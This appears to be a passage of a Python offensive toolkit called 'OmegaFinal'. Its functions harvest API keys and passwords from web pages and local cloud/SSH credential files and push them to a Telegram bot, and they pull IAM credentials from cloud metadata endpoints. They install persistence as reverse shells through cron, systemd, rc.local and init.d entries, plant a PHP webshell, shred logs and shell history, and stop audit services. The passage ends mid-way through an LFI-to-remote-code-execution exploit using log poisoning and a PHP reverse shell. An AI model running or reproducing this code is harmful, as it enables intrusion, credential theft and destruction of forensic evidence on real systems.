        Scan HTML and JavaScript for API keys, emails, passwords, and secrets.

        Args:
            urls: List of URLs to scan

        Returns:
            List of discovered credentials

        Example:
            >>> creds = self.harvest_credentials(["https://example.com"])
            >>> for c in creds:
            ...     print(f"{c['credential_type']}: {c['password'][:20]}...")
            AWS_KEY: AKIAIOSFODNN7EXAMPLE...
            API_KEY: sk-live-abc123def456...
        """
        self.print_header(f"Harvesting credentials from {len(urls)} URLs", "STEP")
        results = []

        patterns = {
            'AWS_KEY': r'AKIA[0-9A-Z]{16}',
            'AWS_SECRET': r'[A-Za-z0-9/+=]{40}',
            'API_KEY': r'sk-live-[A-Za-z0-9]{32}',
            'API_KEY_ALT': r'sk_test_[A-Za-z0-9]{32}',
            'GITHUB_TOKEN': r'ghp_[A-Za-z0-9]{36}',
            'STRIPE_KEY': r'sk_live_[A-Za-z0-9]{24}',
            'GOOGLE_API': r'AIza[0-9A-Za-z-_]{35}',
            'RSA_KEY': r'-----BEGIN (?:RSA|DSA|EC|OPENSSH) PRIVATE KEY-----',
            'EMAIL': r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}',
            'PHONE': r'\+?[0-9]{1,3}[-.\s]?[0-9]{3}[-.\s]?[0-9]{3}[-.\s]?[0-9]{4}',
            'PASSWORD': r'password[\s=:]+["\']?([^"\'\s]+)["\']?',
            'USERNAME': r'username[\s=:]+["\']?([^"\'\s]+)["\']?',
            'API_TOKEN': r'token[\s=:]+["\']?([^"\'\s]+)["\']?',
            'SECRET_KEY': r'secret[\s=:]+["\']?([^"\'\s]+)["\']?',
            'AUTH_TOKEN': r'auth_token[\s=:]+["\']?([^"\'\s]+)["\']?',
            'MYSQL_PASS': r'mysql_pass[\s=:]+["\']?([^"\'\s]+)["\']?',
            'POSTGRES_PASS': r'postgres_pass[\s=:]+["\']?([^"\'\s]+)["\']?',
            'REDIS_PASS': r'redis_pass[\s=:]+["\']?([^"\'\s]+)["\']?',
            'MONGODB_PASS': r'mongodb_pass[\s=:]+["\']?([^"\'\s]+)["\']?',
            'JWT_SECRET': r'jwt_secret[\s=:]+["\']?([^"\'\s]+)["\']?',
            'SESSION_SECRET': r'session_secret[\s=:]+["\']?([^"\'\s]+)["\']?',
            'SMTP_PASS': r'smtp_pass[\s=:]+["\']?([^"\'\s]+)["\']?',
            'DB_PASS': r'db_pass[\s=:]+["\']?([^"\'\s]+)["\']?',
            'DB_PASSWORD': r'db_password[\s=:]+["\']?([^"\'\s]+)["\']?'
        }

        for url in urls[:100]:
            if self.stop_event.is_set():
                break

            probe = self.http_probe(url)
            if probe.get('status', 0) != 200:
                continue

            body = probe.get('body_preview', '')

            for cred_type, pattern in patterns.items():
                matches = re.findall(pattern, body, re.IGNORECASE)
                for match in matches:
                    if len(match) > 3:
                        results.append({
                            'source': url,
                            'credential_type': cred_type,
                            'username': '',
                            'password': match[:100],
                            'url': url
                        })
                        self.print_found("CRED", f"{cred_type}: {match[:20]}...")
                        with dashboard_lock:
                            dashboard_data['credentials_found'].append(f"{cred_type}: {match[:10]}...")
                            dashboard_data['total_credentials'] += 1

                        self.log_to_db('credentials', {
                            'source': url,
                            'credential_type': cred_type,
                            'username': '',
                            'password': match[:100],
                            'url': url
                        })

                        if self.telegram:
                            self.telegram.alert(
                                "CREDENTIAL FOUND",
                                f"Type: {cred_type}\nValue: {match[:50]}...\nSource: {url}",
                                "CRITICAL"
                            )

        self.save_json(results, f"credentials_{TIMESTAMP}.json")
        return results


    def cloud_credential_scan(
        self
    ) -> List[Dict[str, Any]]:
        """
        Scan local system for cloud provider credentials.

        Args:
            None

        Returns:
            List of discovered cloud credential files

        Example:
            >>> creds = self.cloud_credential_scan()
            >>> for c in creds:
            ...     print(f"{c['provider']}: {c['path']}")
            AWS: /root/.aws/credentials
            GCP: /root/.config/gcloud/credentials.db
        """
        self.print_header("Scanning for cloud credentials", "STEP")
        results = []

        cloud_paths = [
            ('~/.aws/credentials', 'AWS'),
            ('~/.aws/config', 'AWS'),
            ('~/.config/gcloud/credentials.db', 'GCP'),
            ('~/.azure/accessTokens.json', 'Azure'),
            ('~/.kube/config', 'Kubernetes'),
            ('~/.docker/config.json', 'Docker'),
            ('~/.terraform.d/credentials.tfrc.json', 'Terraform'),
            ('~/.ansible/ansible.cfg', 'Ansible'),
            ('~/.ssh/id_rsa', 'SSH'),
            ('~/.ssh/id_dsa', 'SSH'),
            ('~/.ssh/id_ecdsa', 'SSH'),
            ('~/.ssh/id_ed25519', 'SSH'),
            ('~/.ssh/authorized_keys', 'SSH'),
            ('~/.ssh/known_hosts', 'SSH'),
            ('/etc/ssl/private/', 'SSL'),
            ('/etc/letsencrypt/live/', 'SSL'),
            ('/var/lib/cloud/instance/user-data.txt', 'Cloud-Init')
        ]

        for path_pattern, provider in cloud_paths:
            expanded = os.path.expanduser(path_pattern)
            if os.path.exists(expanded):
                try:
                    with open(expanded, 'r') as f:
                        content = f.read()
                    self.print_found("CRED", f"Cloud credential: {expanded} ({provider})")
                    results.append({
                        'path': expanded,
                        'provider': provider,
                        'content': content[:1000]
                    })
                    if self.telegram:
                        self.telegram.send_document(
                            Path(expanded),
                            f"Cloud credential: {expanded}"
                        )
                except Exception:
                    pass

        self.save_json(results, f"cloud_creds_{TIMESTAMP}.json")
        return results

    # ===================================================================
    # 12. CLOUD METADATA
    # ===================================================================

    def scan_cloud_metadata(
        self
    ) -> List[Dict[str, Any]]:
        """
        Scan cloud metadata endpoints for AWS, Azure, GCP, and others.

        Args:
            None

        Returns:
            List of accessible metadata endpoints

        Example:
            >>> metadata = self.scan_cloud_metadata()
            >>> for m in metadata:
            ...     print(f"{m['provider']}: {m['data'][:100]}...")
            AWS: ami-id=ami-0abcdef1234567890...
        """
        self.print_header("Scanning cloud metadata", "STEP")
        results = []

        endpoints = [
            ('AWS', 'http://169.254.169.254/latest/meta-data/'),
            ('AWS-IMDSv2', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'),
            ('AWS-UserData', 'http://169.254.169.254/latest/user-data/'),
            ('Azure', 'http://169.254.169.254/metadata/instance?api-version=2021-02-01'),
            ('GCP', 'http://metadata.google.internal/computeMetadata/v1/'),
            ('DigitalOcean', 'http://169.254.169.254/metadata/v1/'),
            ('Vultr', 'http://169.254.169.254/v1/'),
            ('Linode', 'http://169.254.169.254/latest/meta-data/'),
            ('Scaleway', 'http://169.254.169.254/latest/meta-data/'),
            ('Alibaba', 'http://100.100.100.200/latest/meta-data/'),
            ('Oracle', 'http://169.254.169.254/opc/v1/'),
            ('AWS-EC2', 'http://instance-data.ec2.internal/latest/meta-data/')
        ]

        for provider, url in endpoints:
            if self.stop_event.is_set():
                break

            try:
                headers = {'Metadata-Flavor': 'Google'} if 'google' in url else {}
                if 'Azure' in provider:
                    headers['Metadata'] = 'true'

                if REQUESTS_AVAILABLE:
                    proxies = {}
                    if self.config.get('tor', False):
                        proxies = {
                            'http': 'socks5://127.0.0.1:9050',
                            'https': 'socks5://127.0.0.1:9050'
                        }
                    resp = requests.get(
                        url,
                        headers=headers,
                        proxies=proxies,
                        timeout=5,
                        verify=False
                    )

                    if resp.status_code == 200:
                        self.print_found("CLOUD", f"{provider} metadata accessible")
                        results.append({
                            'provider': provider,
                            'endpoint': url,
                            'data': resp.text[:10000]
                        })
                        self.log_to_db('cloud_metadata', {
                            'provider': provider,
                            'endpoint': url,
                            'data': resp.text[:10000]
                        })
                        if self.telegram:
                            self.telegram.alert(
                                "CLOUD METADATA",
                                f"Provider: {provider}\nURL: {url}\nData: {resp.text[:500]}",
                                "CRITICAL"
                            )
            except Exception:
                pass

        self.save_json(results, f"cloud_metadata_{TIMESTAMP}.json")
        return results

    # ===================================================================
    # 13. PERSISTENCE & LATERAL MOVEMENT
    # ===================================================================

    def install_persistence(
        self,
        target: str,
        method: str = 'auto'
    ) -> Dict[str, Any]:
        """
        Install persistence on a target system.

        Args:
            target: Target IP or hostname
            method: Persistence method ('auto', 'cron', 'systemd', 'ssh', 'webshell', 'rc_local', 'profile', 'at_job', 'init_d', 'ld_preload', 'wmi', 'scheduled_task', 'registry')

        Returns:
            Dictionary with persistence installation details

        Example:
            >>> result = self.install_persistence("192.168.1.10", "cron")
            >>> print(result['method'])
            cron
        """
        self.print_danger(f"Installing persistence on {target} via {method}")

        methods = [
            'cron', 'systemd', 'ssh', 'webshell', 'rc_local',
            'profile', 'at_job', 'init_d', 'ld_preload',
            'wmi', 'scheduled_task', 'registry'
        ]

        if method != 'auto' and method not in methods:
            return {'success': False, 'error': f'Unknown method: {method}'}

        if method == 'auto':
            method = random.choice(methods)

        result = {'method': method, 'target': target, 'active': True}

        if method == 'cron':
            cron_cmd = (
                f"{self.cron_interval} /bin/bash -c 'bash -i >& /dev/tcp/"
                f"{self.config.get('reverse_shell_ip', '0.0.0.0')}/"
                f"{self.config.get('reverse_shell_port', 4444)} 0>&1'"
            )
            result['command'] = cron_cmd
            result['location'] = '/etc/crontab'

        elif method == 'systemd':
            service_content = (
                f"[Unit]\nDescription=OmegaFinal\nAfter=network.target\n"
                f"[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/"
                f"{self.config.get('reverse_shell_ip', '0.0.0.0')}/"
                f"{self.config.get('reverse_shell_port', 4444)} 0>&1'\n"
                f"Restart=always\n[Install]\nWantedBy=multi-user.target"
            )
            result['content'] = service_content
            result['location'] = '/etc/systemd/system/omega.service'

        elif method == 'ssh':
            result['ssh_key'] = self.config.get(
                'ssh_public_key',
                'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQ...'
            )
            result['location'] = '~/.ssh/authorized_keys'

        elif method == 'webshell':
            shell_code = '<?php if(isset($_GET["cmd"])){system($_GET["cmd"]);} ?>'
            result['shell_code'] = shell_code
            result['location'] = '/var/www/html/omega_shell.php'

        elif method == 'rc_local':
            result['command'] = (
                f"bash -c 'bash -i >& /dev/tcp/"
                f"{self.config.get('reverse_shell_ip', '0.0.0.0')}/"
                f"{self.config.get('reverse_shell_port', 4444)} 0>&1' &"
            )
            result['location'] = '/etc/rc.local'

        elif method == 'profile':
            result['command'] = (
                f"bash -c 'bash -i >& /dev/tcp/"
                f"{self.config.get('reverse_shell_ip', '0.0.0.0')}/"
                f"{self.config.get('reverse_shell_port', 4444)} 0>&1' &"
            )
            result['location'] = '~/.profile'

        elif method == 'at_job':
            result['command'] = (
                f"echo '/bin/bash -c \"bash -i >& /dev/tcp/"
                f"{self.config.get('reverse_shell_ip', '0.0.0.0')}/"
                f"{self.config.get('reverse_shell_port', 4444)} 0>&1\"' | "
                f"at now + 5 minutes"
            )
            result['location'] = '/var/spool/at/'

        elif method == 'init_d':
            init_script = (
                f"#!/bin/bash\n/usr/bin/nc "
                f"{self.config.get('reverse_shell_ip', '0.0.0.0')} "
                f"{self.config.get('reverse_shell_port', 4444)} -e /bin/sh"
            )
            result['script'] = init_script
            result['location'] = '/etc/init.d/omega'

        elif method == 'ld_preload':
            result['command'] = "export LD_PRELOAD=/tmp/lib.so"
            result['location'] = '~/.bashrc'

        with dashboard_lock:
            dashboard_data['total_persistence'] += 1

        self.log_to_db('persistence', {
            'target': target,
            'method': method,
            'location': result.get('location', ''),
            'active': 1
        })

        if self.telegram:
            self.telegram.alert(
                "PERSISTENCE INSTALLED",
                f"Target: {target}\nMethod: {method}\nLocation: {result.get('location', 'Unknown')}",
                "CRITICAL"
            )

        return result

    # ===================================================================
    # 14. ANTI-FORENSICS
    # ===================================================================

    def wipe_logs(
        self,
        target: str
    ) -> None:
        """
        Wipe system logs on a target.

        Args:
            target: Target IP or hostname

        Returns:
            None

        Example:
            >>> self.wipe_logs("192.168.1.10")
            # All logs shredded
        """
        self.print_danger(f"Wiping logs on {target}")

        log_paths = [
            '/var/log/auth.log', '/var/log/syslog', '/var/log/messages',
            '/var/log/apache2/*.log', '/var/log/nginx/*.log',
            '/var/log/mysql/*.log', '/var/log/postgresql/*.log',
            '/var/log/redis/*.log', '/var/log/mongodb/*.log',
            '/var/log/elasticsearch/*.log', '/var/log/kibana/*.log',
            '/var/log/grafana/*.log', '/var/log/prometheus/*.log',
            '/var/log/alertmanager/*.log', '/var/log/audit/audit.log',
            '/var/log/faillog', '/var/log/lastlog', '/var/log/wtmp',
            '/var/log/btmp', '/var/log/utmp'
        ]

        for log_path in log_paths:
            try:
                subprocess.run(
                    ['shred', '-n', '200', '-z', '-u', log_path],
                    capture_output=True
                )
            except Exception:
                pass

        try:
            subprocess.run(['systemctl', 'stop', 'rsyslog'], capture_output=True)
            subprocess.run(['systemctl', 'stop', 'auditd'], capture_output=True)
            subprocess.run(['systemctl', 'stop', 'journald'], capture_output=True)
        except Exception:
            pass

        if self.telegram:
            self.telegram.alert(
                "LOGS WIPED",
                f"Target: {target}\nAll logs shredded",
                "HIGH"
            )


    def clear_history(
        self,
        target: str
    ) -> None:
        """
        Clear shell history on a target.

        Args:
            target: Target IP or hostname

        Returns:
            None

        Example:
            >>> self.clear_history("192.168.1.10")
            # All history files shredded
        """
        self.print_danger(f"Clearing history on {target}")

        history_files = [
            '~/.bash_history', '~/.zsh_history', '~/.sh_history',
            '~/.python_history', '~/.mysql_history', '~/.psql_history',
            '~/.rediscli_history', '~/.node_repl_history', '~/.irb_history',
            '~/.sudo_history', '~/.npm_history', '~/.pip_history',
            '~/.git_history', '~/.hg_history', '~/.svn_history',
            '~/.cvs_history', '~/.rpm_history', '~/.yum_history',
            '~/.apt_history', '~/.dpkg_history', '~/.make_history',
            '~/.gcc_history', '~/.vim_history', '~/.emacs_history',
            '~/.nano_history', '~/.less_history', '~/.more_history',
            '~/.man_history', '~/.info_history', '~/.screen_history',
            '~/.tmux_history', '~/.byobu_history', '~/.irssi_history',
            '~/.weechat_history', '~/.ircii_history', '~/.scrollz_history',
            '~/.BitchX_history', '~/.epic_history', '~/.tin_history',
            '~/.slrn_history', '~/.nn_history', '~/.gnus_history',
            '~/.mutt_history', '~/.pine_history', '~/.elm_history',
            '~/.mail_history', '~/.csh_history', '~/.ksh_history',
            '~/.tcsh_history', '~/.fish_history', '~/.elvish_history',
            '~/.nushell_history', '~/.xonsh_history', '~/.powerline_history'
        ]

        for hist_file in history_files:
            try:
                subprocess.run(
                    ['shred', '-n', '200', '-z', '-u', os.path.expanduser(hist_file)],
                    capture_output=True
                )
            except Exception:
                pass

        try:
            subprocess.run(['history', '-c'], capture_output=True)
            subprocess.run(['unset', 'HISTFILE'], capture_output=True)
        except Exception:
            pass

        if self.telegram:
            self.telegram.alert(
                "HISTORY CLEARED",
                f"Target: {target}\nAll history files shredded",
                "HIGH"
            )

    # ===================================================================
    # 15. ARCHIVE & REPORTING
    # ===================================================================

    def create_archive(
        self
    ) -> Optional[Path]:
        """
        Create a password-protected ZIP archive of all findings.

        Returns:
            Path to the created archive, or None on failure

        Example:
            >>> archive = self.create_archive()
            >>> print(archive)
            /root/omega_final/output/recon/omega_archive_20260727_143215.zip
        """
        self.print_header("Creating password-protected archive", "STEP")
        archive_path = RECON_DIR / f"omega_archive_{TIMESTAMP}.zip"

        try:
            if PYZIPPER_AVAILABLE:
                with pyzipper.AESZipFile(
                    archive_path,
                    'w',
                    compression=pyzipper.ZIP_DEFLATED,
                    encryption=pyzipper.WZ_AES
                ) as zipf:
                    zipf.setpassword(self.password.encode())

                    for file_path in RECON_DIR.rglob('*'):
                        if file_path.is_file() and file_path.suffix in [
                            '.json', '.log', '.txt', '.html', '.csv', '.md'
                        ]:
                            zipf.write(file_path, file_path.relative_to(RECON_DIR))

                    for file_path in EXFIL_DIR.rglob('*'):
                        if file_path.is_file():
                            zipf.write(file_path, Path('exfil') / file_path.name)

                    for file_path in LOGS_DIR.rglob('*'):
                        if file_path.is_file():
                            zipf.write(file_path, Path('logs') / file_path.name)
            else:
                with zipfile.ZipFile(archive_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                    for file_path in RECON_DIR.rglob('*'):
                        if file_path.is_file() and file_path.suffix in [
                            '.json', '.log', '.txt', '.html', '.csv', '.md'
                        ]:
                            zipf.write(file_path, file_path.relative_to(RECON_DIR))

                    for file_path in EXFIL_DIR.rglob('*'):
                        if file_path.is_file():
                            zipf.write(file_path, Path('exfil') / file_path.name)

                    for file_path in LOGS_DIR.rglob('*'):
                        if file_path.is_file():
                            zipf.write(file_path, Path('logs') / file_path.name)

            self.print_header(f"Archive created: {archive_path} (Password: {self.password})", "DONE")
            return archive_path
        except Exception as e:
            self.logger.error(f"Archive creation failed: {e}")
            return None


    def generate_report_html(
        self
    ) -> Optional[Path]:
        """
        Generate an HTML report of all findings.

        Returns:
            Path to the generated HTML report, or None on failure

        Example:
            >>> report = self.generate_report_html()
            >>> print(report)
            /root/omega_final/output/reports/omega_report_20260727_143215.html
        """
        self.print_header("Generating HTML report", "STEP")
        report_path = REPORTS_DIR / f"omega_report_{TIMESTAMP}.html"

        try:
            html_content = self.results.to_html()
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            self.print_header(f"HTML report saved: {report_path}", "DONE")
            return report_path
        except Exception as e:
            self.logger.error(f"HTML report generation failed: {e}")
            return None

    # ===================================================================
    # 16. SELF-DESTRUCT
    # ===================================================================

    def self_destruct_phase(
        self
    ) -> None:
        """
        Delete itself, wipe logs, uninstall tools, and clear all traces.

        Returns:
            None

        Example:
            >>> self.self_destruct_phase()
            🔥 SELF-DESTRUCT ACTIVATED
            ✅ Self-destruct completed. All traces removed.
        """
        self.print_danger("🔥 SELF-DESTRUCT ACTIVATED")

        try:
            self.kill_all_processes()
            self.wipe_logs('localhost')
            self.clear_history('localhost')

            try:
                subprocess.run(
                    ['shred', '-n', '200', '-z', '-u', __file__],
                    capture_output=True
                )
            except Exception:
                try:
                    os.remove(__file__)
                except Exception:
                    pass

            try:
                shutil.rmtree(LOGS_DIR, ignore_errors=True)
            except Exception:
                pass

            try:
                shutil.rmtree(TEMP_DIR, ignore_errors=True)
            except Exception:
                pass

            try:
                subprocess.run(
                    ['shred', '-n', '200', '-z', '-u', '~/.bash_history'],
                    capture_output=True
                )
            except Exception:
                pass

            try:
                subprocess.run(
                    ['shred', '-n', '200', '-z', '-u', '~/.zsh_history'],
                    capture_output=True
                )
            except Exception:
                pass

            try:
                subprocess.run(
                    ['shred', '-n', '200', '-z', '-u', '~/.python_history'],
                    capture_output=True
                )
            except Exception:
                pass

            try:
                subprocess.run(['systemctl', 'stop', 'rsyslog'], capture_output=True)
                subprocess.run(['systemctl', 'stop', 'auditd'], capture_output=True)
                subprocess.run(['systemctl', 'stop', 'journald'], capture_output=True)
            except Exception:
                pass

            with open('/tmp/.omega_done', 'w') as f:
                f.write(f"OmegaFinal self-destructed at {datetime.datetime.now().isoformat()}")

            self.print_danger("✅ Self-destruct completed. All traces removed.")
            if self.telegram:
                self.telegram.alert(
                    "SELF-DESTRUCT COMPLETE",
                    f"OmegaFinal wiped at {datetime.datetime.now().isoformat()}",
                    "CRITICAL"
                )
        except Exception as e:
            self.logger.error(f"Self-destruct error: {e}")

    # ===================================================================
    # 17. DASHBOARD & MONITORING
    # ===================================================================

    def start_dashboard(
        self
    ) -> None:
        """
        Start the live dashboard thread.

        Returns:
            None

        Example:
            >>> self.start_dashboard()
            # Dashboard starts rendering
        """
        global dashboard_running, dashboard_thread

        if dashboard_running:
            return

        dashboard_running = True
        dashboard_data['start_time'] = time.time()
        dashboard_thread = threading.Thread(
            target=self.dashboard_loop,
            daemon=True,
            name="Dashboard"
        )
        dashboard_thread.start()
        self.logger.info("Dashboard started")


    def dashboard_loop(
        self
    ) -> None:
        """
        Main dashboard rendering loop.

        Returns:
            None
        """
        global dashboard_running

        while dashboard_running and not self.stop_event.is_set():
            try:
                with dashboard_lock:
                    dashboard_data['elapsed_time'] = time.time() - dashboard_data.get('start_time', time.time())
                    dashboard_data['active_threads'] = self.active_threads
                    dashboard_data['last_updated'] = time.time()
                    dashboard_data['telegram_alerts'] = self.telegram.sent_count if self.telegram else 0

                self.print_dashboard()
                time.sleep(2)
            except Exception:
                time.sleep(2)

        dashboard_running = False


    def stop_dashboard(
        self
    ) -> None:
        """
        Stop the live dashboard thread.

        Returns:
            None

        Example:
            >>> self.stop_dashboard()
            # Dashboard stops
        """
        global dashboard_running

        dashboard_running = False
        if dashboard_thread:
            dashboard_thread.join(timeout=5)

    # ===================================================================
    # 18. TASK QUEUE & THREADING
    # ===================================================================

    def add_task(
        self,
        priority: int,
        func: Callable,
        args: tuple = (),
        kwargs: dict = None
    ) -> None:
        """
        Add a task to the priority queue.

        Args:
            priority: Task priority (TaskPriority.CRITICAL, HIGH, NORMAL, LOW)
            func: Function to execute
            args: Positional arguments for the function
            kwargs: Keyword arguments for the function

        Returns:
            None

        Example:
            >>> self.add_task(TaskPriority.CRITICAL, self.scan_target, ("192.168.1.1",))
        """
        if kwargs is None:
            kwargs = {}
        self.task_queue.put((priority, (func, args, kwargs)))
        self._increment_metric('tasks_queued')


    def start_workers(
        self,
        num_workers: int = None
    ) -> None:
        """
        Start worker threads for processing tasks.

        Args:
            num_workers: Number of worker threads (defaults to config value)

        Returns:
            None

        Example:
            >>> self.start_workers(50)
            # 50 worker threads started
        """
        if num_workers is None:
            num_workers = min(self.config.get('threads', 1000), 100)

        self.logger.info(f"Starting {num_workers} worker threads")
        for i in range(num_workers):
            thread = threading.Thread(
                target=self.worker_loop,
                daemon=True,
                name=f"Worker-{i+1}"
            )
            thread.start()


    def worker_loop(
        self
    ) -> None:
        """
        Worker thread main loop for processing tasks.

        Returns:
            None
        """
        while not self.stop_event.is_set():
            try:
                priority, task = self.task_queue.get(timeout=1)
                if task is None:
                    break

                func, args, kwargs = task

                with self.thread_lock:
                    self.active_threads += 1

                try:
                    func(*args, **kwargs)
                except Exception as e:
                    self.logger.debug(f"Worker task failed: {e}")
                finally:
                    with self.thread_lock:
                        self.active_threads -= 1
                    self.task_queue.task_done()

            except queue.Empty:
                continue
            except Exception:
                continue


    def shutdown_workers(
        self
    ) -> None:
        """
        Gracefully shutdown all worker threads.

        Returns:
            None

        Example:
            >>> self.shutdown_workers()
            # All workers stopped
        """
        self.logger.info("Shutting down workers...")
        for _ in range(self.config.get('threads', 1000)):
            self.task_queue.put((0, None))
        self.task_queue.join()

    # ===================================================================
    # 19. MAIN EXECUTION FLOW
    # ===================================================================

    def scan_target(
        self,
        target: str
    ) -> None:
        """
        Scan a single target: subdomains → ports → HTTP → vulns → exfil.

        Args:
            target: Target domain, IP, or CIDR

        Returns:
            None

        Example:
            >>> self.scan_target("example.com")
            # Full target scan runs
        """
        self.logger.info(f"🎯 Scanning target: {target}")
        self._add_checkpoint('target_start', target)
        self._increment_metric('targets_scanned')

        target_type = self._detect_target_type(target)
        self.log_to_db('targets', {
            'target': target,
            'type': target_type,
            'status': 'scanning'
        })

        ips = self.resolve_target(target)
        if not ips:
            self.logger.warning(f"Could not resolve target: {target}")
            self.log_to_db('targets', {
                'target': target,
                'type': target_type,
                'status': 'failed',
                'metadata': json.dumps({'error': 'resolution_failed'})
            })
            return

        self.logger.info(f"Resolved {target} to {len(ips)} IP(s)")

        alive_ips = []
        total_ips = len(ips[:50])

        for idx, ip in enumerate(ips[:50]):
            if self.ping_host(ip):
                alive_ips.append(ip)
                self.logger.debug(f"Host {ip} is alive")
            if idx % 10 == 0:
                self.print_progress(idx, total_ips, f"Pinging hosts for {target}")

        if not alive_ips:
            self.logger.warning(f"No alive hosts found for {target}")
            self.log_to_db('targets', {
                'target': target,
                'type': target_type,
                'status': 'failed',
                'metadata': json.dumps({'error': 'no_alive_hosts'})
            })
            return

        all_ports = self.scan_ports_batch(alive_ips[:20])

        web_urls = []
        for port_info in all_ports:
            if port_info['port'] in [80, 443, 8080, 8443, 3000, 5000, 8000, 9000]:
                protocol = 'https' if port_info['port'] in [443, 8443] else 'http'
                url = f"{protocol}://{port_info['ip']}:{port_info['port']}"
                web_urls.append(url)

        if web_urls:
            self.probe_http_endpoints(alive_ips[:50])
            self.detect_technologies(web_urls)
            self.detect_exposed_files(web_urls)
            self.detect_waf(web_urls)
            self.discover_apis(web_urls)
            self.quick_vulnerability_test(web_urls)
            self.harvest_credentials(web_urls)

        self.scan_cloud_metadata()
        self.cloud_credential_scan()
        self.detect_honeypots(alive_ips[:50])

        self.save_json(self.results.to_dict(), f"target_{target}_{TIMESTAMP}.json")

        self.log_to_db('targets', {
            'target': target,
            'type': target_type,
            'status': 'completed',
            'metadata': json.dumps(self.results.summary)
        })

        self._add_checkpoint('target_completed', target, self.results.summary)
        self.logger.info(f"Target scan completed: {target} - {len(all_ports)} open ports found")


    def run_phase_1(
        self,
        targets: List[str]
    ) -> ReconResult:
        """
        Full orchestration of all Phase 1 reconnaissance steps.

        Args:
            targets: List of target domains, IPs, or CIDRs

        Returns:
            ReconResult object containing all findings

        Example:
            >>> results = self.run_phase_1(["example.com", "192.168.1.0/24"])
            >>> print(results.summary)
            {'subdomains_found': 1247, 'open_ports': 4789, ...}
        """
        self.print_header("🚀 STARTING OMEGA FINAL PHASE 1", "START")
        self.start_time = time.time()
        self.total_targets = len(targets)

        self.results.summary['scan_id'] = self.scan_id
        self.results.summary['targets'] = targets
        self.results.summary['start_time'] = datetime.datetime.now().isoformat()

        self._transition_state(ScanState.SCANNING)

        self.check_and_install_tools()
        self.start_dashboard()
        self.start_workers()

        for target in targets:
            if self.stop_event.is_set():
                break
            self.scan_target(target)
            self.completed_targets += 1
            self._save_state()

        self.stop_dashboard()
        self.shutdown_workers()

        self._transition_state(ScanState.COMPLETED)

        elapsed = time.time() - self.start_time
        self.results.summary['elapsed_seconds'] = elapsed
        self.results.summary['completed_targets'] = self.completed_targets
        self.results.summary['timestamp'] = datetime.datetime.now().isoformat()

        summary = {
            'subdomains_found': len(self.results.subdomains),
            'open_ports': len(self.results.ports),
            'technologies': len(self.results.technologies),
            'vulnerabilities': len(self.results.vulnerabilities),
            'exfiltrated_files': len(self.results.exfiltrated_files),
            'credentials': len(self.results.credentials),
            'wafs_detected': len(self.results.waf_detections),
            'honeypots': len(self.results.honeypots),
            'apis_found': len(self.results.apis),
            'cves_exploited': len(self.results.cves),
            'shells': len(self.results.shells),
            'persistence': len(self.results.persistence),
            'telegram_alerts': self.telegram.sent_count if self.telegram else 0,
            'elapsed_seconds': elapsed,
            'targets': targets
        }

        self.results.summary.update(summary)

        self.save_json(self.results.to_dict(), f"omega_full_{TIMESTAMP}.json")
        self.print_summary_table(summary)
        self.create_archive()
        self.generate_report_html()

        if self.config.get('self_destruct', False):
            self.self_destruct_phase()

        return self.results

    # ===================================================================
    # 20. EXTERNAL ENTRY POINTS
    # ===================================================================


# ===================================================================
# END OF ReconPhase1 CLASS
# ===================================================================

    def exploit_lfi_to_rce(
        self,
        url: str,
        param: str
    ) -> Optional[Dict[str, Any]]:
        """
        Escalate LFI to RCE via log poisoning, wrapper techniques, and file inclusion.

        Args:
            url: Base URL with query string
            param: Parameter name vulnerable to LFI

        Returns:
            Dict with 'success', 'method', 'output', 'shell' keys, or None on failure

        Raises:
            NetworkError: If the target is unreachable
            TimeoutError: If the operation times out

        Example:
            >>> result = self.exploit_lfi_to_rce("https://example.com/page.php?file=index", "file")
            >>> print(result['output'])
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
        """
        self.print_danger(f"Attempting LFI to RCE escalation on {url}")

        methods = [
            {
                'name': 'log_poison_auth',
                'payload': '../../../../var/log/auth.log',
                'inject': 'ssh: <?php system($_GET["cmd"]); ?>',
                'test': 'id'
            },
            {
                'name': 'log_poison_access',
                'payload': '../../../../var/log/apache2/access.log',
                'inject': '<?php system($_GET["cmd"]); ?>',
                'test': 'id'
            },
            {
                'name': 'log_poison_nginx',
                'payload': '../../../../var/log/nginx/access.log',
                'inject': '<?php system($_GET["cmd"]); ?>',
                'test': 'id'
            },
            {
                'name': 'php_filter',
                'payload': 'php://filter/convert.base64-decode/resource=../../../../etc/passwd',
                'inject': '',
                'test': 'root:x:'
            },
            {
                'name': 'php_input',
                'payload': 'php://input',
                'inject': '<?php system($_GET["cmd"]); ?>',
                'test': 'id'
            },
            {
                'name': 'expect_wrapper',
                'payload': 'expect://id',
                'inject': '',
                'test': 'uid='
            },
            {
                'name': 'data_wrapper',
                'payload': 'data://text/plain,<?php system($_GET["cmd"]); ?>',
                'inject': '',
                'test': 'id'
            }
        ]

        for method in methods:
            try:
                if method.get('inject'):
                    inject_url = f"{url}&{param}={urllib.parse.quote(method['payload'])}" if '?' in url else f"{url}?{param}={urllib.parse.quote(method['payload'])}"
                    self.http_probe(inject_url)

                    if 'auth.log' in method['payload']:
                        headers = {'User-Agent': method['inject']}
                        self.http_probe(url, headers=headers)

                test_payload = f"../../../../var/log/auth.log&cmd={urllib.parse.quote(method['test'])}" if method['name'] == 'log_poison_auth' else f"{method['payload']}&cmd={urllib.parse.quote(method['test'])}"
                test_url = f"{url}&{param}={urllib.parse.quote(test_payload)}" if '?' in url else f"{url}?{param}={urllib.parse.quote(test_payload)}"

                if method['name'] == 'expect_wrapper':
                    test_url = f"{url}&{param}={urllib.parse.quote('expect://id')}" if '?' in url else f"{url}?{param}={urllib.parse.quote('expect://id')}"
                    probe = self.http_probe(test_url)
                    if probe.get('status', 0) == 200:
                        body = probe.get('body_preview', '')
                        if 'uid=' in body:
                            self.print_danger(f"RCE achieved via {method['name']}")
                            result = {
                                'success': True,
                                'method': method['name'],
                                'output': body[:1000],
                                'shell': f"php -r '$sock=fsockopen(\"{self.config.get('reverse_shell_ip', '0.0.0.0')}\",{self.config.get('reverse_shell_port', 4444)});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
                            }
                            if self.telegram:
                                self.telegram.alert(
                                    "LFI→RCE SUCCESS",
